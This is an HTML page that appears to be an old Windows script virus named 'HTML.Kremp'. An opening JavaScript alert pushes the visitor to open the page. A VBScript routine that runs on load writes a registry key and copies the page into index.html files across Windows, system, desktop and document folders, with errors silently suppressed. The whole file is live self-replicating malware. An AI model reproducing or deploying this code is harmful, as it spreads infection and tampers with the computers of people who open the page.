<META NAME="Author" CONTENT="OilSheik Mertimb">
<html><body>

<SCRIPT language=JavaScript>
<!--
var userAgent=navigator.appName;
var userVer=navigator.appVersion;
var agentInfo=userAgent.substring(0, 1);
var agentVer=userVer.substring(0, 1);
if (agentInfo == "M"){
   if (agentVer >="4"){
   alert("Open this page NOW !")
   }
}else {
alert("Please use IE4 for open this page !")
self.close()
history.go(-1)
}
//-->
</SCRIPT>

<SCRIPT language=VBScript>
<!-- HTML.Kremp by OilSheik Mertimb -->
<!-- Not run on Netscape -->
<!--
Sub window_onLoad()
On Error Resume Next 
Set WsShell = CreateObject("WScript.Shell")
WsShell.RegWrite "HKEY_LOCAL_MACHINE\SMF\HTML\Name", "Kremp"
Call KrempKremp("Temp")
Call KrempKremp("My Documents")
Call KrempKremp("Windows\Desktop")
Call KrempKremp("Windows\Web")
Call KrempKremp("Windows\Help")
Call KrempKremp("Windows\Temp")
Call KrempKremp("Windows\System")
Call KrempKremp("Windows")
Call KrempKremp("Winnt\Desktop")
Call KrempKremp("Winnt\Help")
Call KrempKremp("Winnt\Temp")
Call KrempKremp("Winnt\System")
Call KrempKremp("Winnt")
Call KrempKremp("Program Files\Internet Explorer")
End Sub

Sub KrempKremp(Dir)
On Error Resume Next
if FileSystemObject.FolderExists(Dir) then
Set FSO = CreateObject("Scripting.FileSystemObject")
Set Kremp = FSO.CreateTextFile("C:\" + Dir + "\index.html", True)
Set Around = document.body.createTextRange
    Kremp.Write("<META NAME=" + Chr(34) + "Author" + Chr(34) + " CONTENT=" + Chr(34) + "OilSheik Mertimb" + Chr(34)+ ">" + Chr(13) + Chr(10))
    Kremp.Write("<html><body>" + Chr(13) + Chr(10)) 
    Kremp.WriteLine Around.htmlText
    Kremp.Write("<body><html>"+ Chr(13) + Chr(10) + "Get me some oil!" + Chr(13) + Chr(10) + "</body></html>")
    Kremp.Write(FileContents)
    Kremp.Close()
End If
End Sub
</SCRIPT>
<body><html>
Get me some oil! - The OilSheik Mertimb
</body></html>